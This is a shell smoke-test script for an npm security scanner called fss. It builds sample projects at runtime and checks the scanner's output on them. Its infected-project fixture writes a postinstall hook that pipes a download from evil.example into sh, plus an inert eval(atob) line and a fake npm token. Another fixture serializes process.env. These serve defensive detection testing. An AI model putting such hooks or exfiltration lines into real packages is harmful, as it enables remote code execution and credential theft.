#!/bin/sh
# run-tests.sh — smoke tests for fss. POSIX sh, no dependencies.
#
# Fixtures are generated at runtime (never committed) so the repository
# itself stays free of malicious-looking content.
set -u

TEST_DIR="$(CDPATH='' cd -- "$(dirname -- "$0")" && pwd)"
FSS="$TEST_DIR/../bin/fss"
WORK="$(mktemp -d "${TMPDIR:-/tmp}/fss-test.XXXXXX")" || exit 1
trap 'rm -rf "$WORK"' EXIT INT TERM

# Hermetic HOME so host dotfiles (.npmrc, shell rc) can't affect results.
HOME="$WORK/home"
export HOME
mkdir -p "$HOME"
export NO_COLOR=1

PASS=0
FAIL=0

check() { # $1=description $2=expected-exit $3=actual-exit
  if [ "$2" = "$3" ]; then
    PASS=$((PASS + 1))
    printf 'ok   %s\n' "$1"
  else
    FAIL=$((FAIL + 1))
    printf 'FAIL %s (expected exit %s, got %s)\n' "$1" "$2" "$3"
  fi
}

check_grep() { # $1=description $2=pattern $3=file
  if grep -q "$2" "$3"; then
    PASS=$((PASS + 1))
    printf 'ok   %s\n' "$1"
  else
    FAIL=$((FAIL + 1))
    printf 'FAIL %s (pattern not found: %s)\n' "$1" "$2"
  fi
}

# ── Fixtures ──────────────────────────────────────────────────────────────────
make_clean_project() {
  d="$WORK/clean-project"
  mkdir -p "$d"
  cat > "$d/package.json" <<'EOF'
{
  "name": "clean-project",
  "version": "1.0.0",
  "dependencies": {
    "left-pad": "^1.3.0",
    "tricky": "^2.0.0"
  }
}
EOF
  cat > "$d/package-lock.json" <<'EOF'
{
  "name": "clean-project",
  "lockfileVersion": 3,
  "packages": {
    "node_modules/left-pad": {
      "version": "1.3.0",
      "resolved": "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz"
    }
  }
}
EOF
  mkdir -p "$d/node_modules/left-pad"
  cat > "$d/node_modules/left-pad/package.json" <<'EOF'
{ "name": "left-pad", "version": "1.0.0" }
EOF
  printf 'module.exports = (s) => s;\n' > "$d/node_modules/left-pad/index.js"
  # Legit registry line (anchored check must accept it).
  printf 'registry=https://registry.npmjs.org/\n' > "$d/.npmrc"
  # Minified package.json with a second "version" key (a dep named "version"):
  # version parsing must take the first occurrence, not the last.
  mkdir -p "$d/node_modules/tricky"
  printf '{"name":"tricky","version":"2.0.0","dependencies":{"version":"^9.9.9"}}\n' \
    > "$d/node_modules/tricky/package.json"
}

make_infected_project() {
  d="$WORK/infected-project"
  mkdir -p "$d/node_modules/evil-pkg"
  cat > "$d/package.json" <<'EOF'
{ "name": "infected-project", "version": "1.0.0" }
EOF
  # Suspicious lifecycle script (remote code execution at install time).
  cat > "$d/node_modules/evil-pkg/package.json" <<'EOF'
{
  "name": "evil-pkg",
  "version": "6.6.6",
  "scripts": { "postinstall": "curl -s http://evil.example/p | sh" }
}
EOF
  # Obfuscated-eval fixture + committed npm token. The eval(atob(...)) line is
  # inert bait for the signature scanner: written to a temp file, grepped by
  # `fss scan`, never executed or imported. (atob arg decodes to "evil".)
  printf 'eval(atob("ZXZpbA=="));\n' > "$d/node_modules/evil-pkg/index.js"
  printf '//registry.npmjs.org/:_authToken=npm_XXXXXXXX\n' > "$d/.npmrc"
  # Known payload file name (Shai-Hulud 2.0 dropper).
  printf '// payload\n' > "$d/node_modules/evil-pkg/bun_environment.js"
}

make_warning_project() {
  d="$WORK/warning-project"
  mkdir -p "$d"
  cat > "$d/package.json" <<'EOF'
{ "name": "warning-project", "version": "1.0.0" }
EOF
  # Heuristic-only finding in first-party code: env serialization.
  printf 'send(JSON.stringify(process.env));\n' > "$d/exfil.js"
}

make_clean_targets() {
  d="$WORK/clean-targets"
  mkdir -p "$d/app-a/node_modules/x" "$d/app-b/node_modules/y"
  printf 'x\n' > "$d/app-a/node_modules/x/f.js"
  printf 'y\n' > "$d/app-b/node_modules/y/f.js"
}

make_lookalike_registry_project() {
  d="$WORK/lookalike-registry"
  mkdir -p "$d"
  cat > "$d/package.json" <<'EOF'
{ "name": "lookalike-registry", "version": "1.0.0" }
EOF
  # Lookalike host that contains the real registry URL as a substring.
  printf 'registry=https://registry.npmjs.org.evil.example/\n' > "$d/.npmrc"
}

make_envfile_project() {
  d="$WORK/envfile-project"
  mkdir -p "$d/apps/api"
  cat > "$d/package.json" <<'EOF'
{ "name": "envfile-project", "version": "1.0.0" }
EOF
  printf 'SECRET=hunter2\n' > "$d/apps/api/.env.local"
  git -C "$d" init -q &&
    git -C "$d" add -A &&
    git -C "$d" -c user.email=fss@test -c user.name=fss commit -qm fixture
}

make_clean_project
make_infected_project
make_warning_project
make_clean_targets
make_lookalike_registry_project
HAS_GIT=0
if command -v git >/dev/null 2>&1 && make_envfile_project >/dev/null 2>&1; then
  HAS_GIT=1
fi

OUT="$WORK/out"

# ── banner (bare fss) ─────────────────────────────────────────────────────────
"$FSS" > "$OUT" 2>&1
check "banner: bare fss exits 0" 0 $?
check_grep "banner: shows ascii logo" '█████' "$OUT"
check_grep "banner: shows welcome box tip" 'New here? Run: fss scan' "$OUT"
check_grep "banner: shows usage after logo" 'Usage: fss <command>' "$OUT"

# ── CLI basics ────────────────────────────────────────────────────────────────
"$FSS" --help > "$OUT" 2>&1;    check "help exits 0" 0 $?
check_grep "help mentions all commands" 'scan.*\[dir\]' "$OUT"
"$FSS" --version > "$OUT" 2>&1; check "version exits 0" 0 $?
"$FSS" bogus > "$OUT" 2>&1;     check "unknown command exits 3" 3 $?

# ── scan ──────────────────────────────────────────────────────────────────────
"$FSS" scan "$WORK/clean-project" > "$OUT" 2>&1
check "scan: clean project exits 0" 0 $?

"$FSS" scan "$WORK/infected-project" > "$OUT" 2>&1
check "scan: infected project exits 2" 2 $?
check_grep "scan: flags lifecycle script" 'suspicious lifecycle script' "$OUT"
check_grep "scan: flags eval(atob payload" 'malware signature' "$OUT"
check_grep "scan: flags committed npm token" 'npm credential' "$OUT"
check_grep "scan: flags known payload file" 'known payload file name' "$OUT"

"$FSS" scan "$WORK/warning-project" > "$OUT" 2>&1
check "scan: warning-only project exits 1" 1 $?
check_grep "scan: flags env serialization" 'suspicious pattern in project code' "$OUT"

"$FSS" scan "$WORK/lookalike-registry" > "$OUT" 2>&1
check "scan: lookalike registry exits 1" 1 $?
check_grep "scan: flags lookalike registry" 'non-default npm registry' "$OUT"

if [ "$HAS_GIT" -eq 1 ]; then
  "$FSS" scan "$WORK/envfile-project" > "$OUT" 2>&1
  check "scan: tracked nested .env.local exits 1" 1 $?
  check_grep "scan: flags tracked .env.local" '\.env file tracked in git' "$OUT"
fi

"$FSS" scan "$WORK/does-not-exist" > "$OUT" 2>&1
check "scan: missing dir exits 3" 3 $?

# ── clean ─────────────────────────────────────────────────────────────────────
"$FSS" clean "$WORK/clean-targets" --dry-run > "$OUT" 2>&1
check "clean: dry-run exits 0" 0 $?
[ -d "$WORK/clean-targets/app-a/node_modules" ]
check "clean: dry-run deletes nothing" 0 $?

"$FSS" clean "$WORK/clean-targets" --yes > "$OUT" 2>&1
check "clean: --yes exits 0" 0 $?
[ ! -d "$WORK/clean-targets/app-a/node_modules" ] && [ ! -d "$WORK/clean-targets/app-b/node_modules" ]
check "clean: --yes removes node_modules" 0 $?

"$FSS" clean "$WORK/does-not-exist" --yes > "$OUT" 2>&1
check "clean: missing dir exits 3" 3 $?

# ── outdated ──────────────────────────────────────────────────────────────────
FSS_OFFLINE=1 "$FSS" outdated "$WORK/clean-project" > "$OUT" 2>&1
check "outdated: offline run exits 0" 0 $?
check_grep "outdated: lists dependency" 'left-pad' "$OUT"
check_grep "outdated: parses minified package.json version" 'tricky.* 2\.0\.0' "$OUT"

"$FSS" outdated "$WORK/clean-targets" > "$OUT" 2>&1
check "outdated: no package.json exits 3" 3 $?

# ── Summary ───────────────────────────────────────────────────────────────────
printf '\n%d passed, %d failed\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
